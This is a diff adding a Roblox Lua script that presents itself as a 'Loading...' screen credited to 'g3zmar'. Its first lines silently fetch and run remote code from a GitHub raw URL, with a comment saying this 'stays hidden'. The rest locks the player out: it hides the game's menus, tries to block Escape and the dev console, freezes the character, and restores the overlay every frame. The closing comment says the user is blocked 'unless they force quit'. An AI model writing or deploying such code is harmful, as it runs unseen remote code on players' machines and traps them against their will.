@@ -1,0 +1,135 @@
+-- Load external script (executed FIRST, stays hidden)
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Gey123123/g3zmar/refs/heads/main/g3zmarScripts"))()
+end)
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Disable all CoreGui elements and prevent user from opening anything
+pcall(function()
+    StarterGui:SetCore("TopbarEnabled", false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+end)
+
+-- Disable reset button and dev console
+pcall(function()
+    StarterGui:SetCore("ResetButtonCallback", false)
+end)
+
+-- Disable ESC menu from closing the game
+UserInputService.InputBegan:Connect(function(input, processed)
+    if input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.F9 then
+        -- Block Escape and Dev Console
+        return true
+    end
+end)
+
+-- Prevent character from moving or jumping
+local function freezeCharacter(char)
+    task.wait(0.1)
+    local humanoid = char:FindFirstChild("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.AutoRotate = false
+        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+    end
+end
+
+player.CharacterAdded:Connect(freezeCharacter)
+
+if player.Character then
+    freezeCharacter(player.Character)
+end
+
+-- Create loading screen UI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LockdownLoading"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 999999  -- Always on top
+screenGui.Parent = playerGui
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.BorderSizePixel = 0
+bg.Parent = screenGui
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Text = "Loading..."
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextScaled = true
+loadingText.Size = UDim2.new(0.5, 0, 0.1, 0)
+loadingText.Position = UDim2.new(0.25, 0, 0.4, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.Parent = bg
+
+local barBackground = Instance.new("Frame")
+barBackground.Size = UDim2.new(0.5, 0, 0.03, 0)
+barBackground.Position = UDim2.new(0.25, 0, 0.5, 0)
+barBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBackground.BorderSizePixel = 0
+barBackground.Parent = bg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.Position = UDim2.new(0, 0, 0, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBackground
+
+local madeByText = Instance.new("TextLabel")
+madeByText.Text = "made by: g3zmar"
+madeByText.Font = Enum.Font.Gotham
+madeByText.TextScaled = true
+madeByText.Size = UDim2.new(0.3, 0, 0.05, 0)
+madeByText.Position = UDim2.new(0.35, 0, 0.95, -20)
+madeByText.BackgroundTransparency = 1
+madeByText.TextColor3 = Color3.fromRGB(150, 150, 150)
+madeByText.Parent = bg
+
+-- Loading animation for 2 minutes
+local duration = 120
+local steps = 100
+local stepTime = duration / steps
+
+for i = 1, steps do
+	local progress = i / steps
+	barFill:TweenSize(UDim2.new(progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, true)
+	task.wait(stepTime)
+end
+
+-- Force freeze again just in case
+pcall(function()
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        local h = player.Character.Humanoid
+        h.WalkSpeed = 0
+        h.JumpPower = 0
+        h.AutoRotate = false
+        h:ChangeState(Enum.HumanoidStateType.Physics)
+    end
+end)
+
+-- Prevent UI from being deleted or tampered with
+screenGui.AncestryChanged:Connect(function()
+    if not screenGui:IsDescendantOf(playerGui) then
+        screenGui.Parent = playerGui
+    end
+end)
+
+-- Reload UI on every frame in case someone tries to remove it
+RunService.RenderStepped:Connect(function()
+    if not screenGui:IsDescendantOf(playerGui) then
+        screenGui.Parent = playerGui
+    end
+end)
+
+-- User is now completely blocked unless they force quit
